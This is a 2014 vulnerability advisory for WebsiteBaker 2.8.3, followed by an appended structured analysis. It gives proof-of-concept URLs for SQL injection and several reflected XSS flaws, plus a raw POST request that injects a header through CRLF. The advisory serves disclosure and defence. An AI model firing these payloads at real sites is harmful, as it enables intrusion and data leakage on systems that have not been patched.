MGC ALERT 2014-004
- Original release date: March 11, 2014
- Last revised:  November 18, 2014
- Discovered by: Manuel Garcia Cardenas
- Severity: 10/10 (CVSS Base Score)
=============================================

I. VULNERABILITY
-------------------------
Multiple Vulnerabilities in WebsiteBaker 2.8.3

III. DESCRIPTION
-------------------------
It is possible to inject SQL code in the variable "id" on the page
"modify.php". This bug was found using the portal without authentication.
To exploit the vulnerability only is needed use the version 1.0 of the HTTP
protocol to interact with the application.
Has been detected a reflected XSS vulnerability in WebsiteBaker, that
allows the execution of arbitrary HTML/script code to be executed in the
context of the victim user's browser.
An input validation problem exists within WebsiteBaker which allows
injecting CR (carriage return - %0D or \r) and LF (line feed - %0A or \n)
characters into the server HTTP response header, resulting in a HTTP
Response Splitting Vulnerability.

IV. PROOF OF CONCEPT
-------------------------
SQL Injection:

/wb/admin/pages/modify.php?page_id=1

Cross-Site Scripting GET:

/wb/admin/admintools/tool.php?tool=captcha_control&6d442"><script>alert(1)</script>8e3b12642a8=1
/wb/modules/edit_module_files.php?page_id=1&mod_dir=news&edit_file=frontend.css&action=edit&page_id=1&section_id=%007e393<script>alert(1)</script>9f8a40a7355f9acf0
/wb/modules/news/add_post.php?page_id=1&section_id=f953a"><script>alert(1)</script>4ddf3369c1f
/wb/modules/news/modify_group.php?page_id=1&section_id=%008cf03"><script>alert(1)</script>2680504c3ec&group_id=62be99873b33d1d3
/wb/modules/news/modify_post.php?page_id=1&section_id=%003874a<script>alert(1)</script>4194d511605&post_id=db89943875a2db52
/wb/modules/news/modify_settings.php?page_id=1&section_id=%008b2f4"><script>alert(1)</script>bdc8b3919b5

HTTP RESPONSE SPLITTING:

If you enter a valid user and password, you can inject on the headers
malicious code, example.

POST /wb/admin/login/index.php HTTP/1.1
Content-Length: 204
Content-Type: application/x-www-form-urlencoded
Referer: <http://192.168.244.129:80/wb/>
Host: 127.0.0.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/28.0.1500.63 Safari/537.36
Accept: */*

password_fieldname=password_nwh1uuwb&password_nwh1uuwb=VALIDPASS&remember=true&submit=Entrar&
url=%0d%0a%20InjectedHeader:MaliciousCode&username_fieldname=username_nwh1uuwb&username_nwh1uuwb=adminResponse

You can inject a new header named: InjectedHeader:MaliciousCode because we
inject a CR&LF new line with %0d%0a%20.

V. BUSINESS IMPACT
-------------------------
Public defacement, confidential data leakage, and database server
compromise can result from these attacks. Client systems can also be
targeted, and complete compromise of these client systems is also possible.

VI. SYSTEMS AFFECTED
-------------------------
WebsiteBaker <= 2.8.3

```
- **Root cause of vulnerability**:
    - SQL Injection: Insufficient input sanitization of the `id` variable in `modify.php`.
    - Cross-Site Scripting (XSS): Lack of input sanitization, allowing injection of arbitrary HTML/script code in multiple parts of the application.
    - HTTP Response Splitting: Improper input validation allowing CR and LF characters injection into HTTP response headers.
- **Weaknesses/vulnerabilities present**:
    - SQL Injection
    - Reflected XSS
    - HTTP Response Splitting
- **Impact of exploitation**:
    - SQL Injection: Database compromise, confidential data leakage.
    - XSS: Execution of arbitrary HTML/script code in the context of victim users browser.
    - HTTP Response Splitting: Injection of arbitrary headers, potentially leading to session hijacking, cache poisoning, etc.
    - Overall: Public defacement, confidential data leakage, database server compromise, client-side compromise.
- **Attack vectors**:
    - SQL Injection: Manipulating the `page_id` parameter in the URL of `modify.php`.
    - XSS:  Injecting script code in multiple parameters like `tool`, `section_id`, `edit_file`, `group_id`, and `post_id` in various application modules via GET requests.
    - HTTP Response Splitting: Injecting CR and LF characters into the `url` parameter during a login POST request.
- **Required attacker capabilities/position**:
    - SQL Injection: No authentication is required
    - XSS: No authentication is required
    - HTTP Response Splitting: Authentication is required, a valid user and password to log in.
